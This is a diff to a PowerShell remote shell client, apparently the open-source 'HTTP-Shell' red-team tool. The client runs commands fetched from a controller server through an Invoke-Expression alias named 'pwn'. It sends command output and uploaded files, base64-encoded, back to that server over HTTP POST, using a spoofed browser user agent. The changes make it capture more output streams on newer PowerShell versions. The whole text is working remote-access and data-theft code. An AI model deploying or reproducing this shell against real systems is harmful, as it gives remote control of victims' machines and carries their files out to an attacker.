@@ -1,4 +1,4 @@
-﻿#============================#
+#============================#
 #  HTTP-Shell by @JoelGMSec  #
 #    https://darkbyte.net    #
 #============================#
@@ -9,6 +9,8 @@ $ProgressPreference = "SilentlyContinue"
 New-Alias -name pwn -Value iex -Force
 $server = $args[1] ; $sleeps = $args[3]
 $userAgent = "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
+$pwshversion = [int]$PSVersionTable.PSVersion.Major
+$redirectors = "6>&1 5>&1 4>&1 3>&1"
 
 # Help
 if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
@@ -86,8 +88,9 @@ while ($true) {
       $file_content = $(R64Encoder -f "$file_path") 2> $null
       $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2> $null }
 
-   if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 ; $param = "Debug"
+   if ($pwshversion -gt 4) { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64 $redirectors") | Out-String) 2>&1 }}
+   else { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 }} ; $param = "Debug"
    if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
    if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
    $output64 = $(R64Encoder -t $commandx) 2> $null ; [string]$path = $param
-   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }}
+   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }
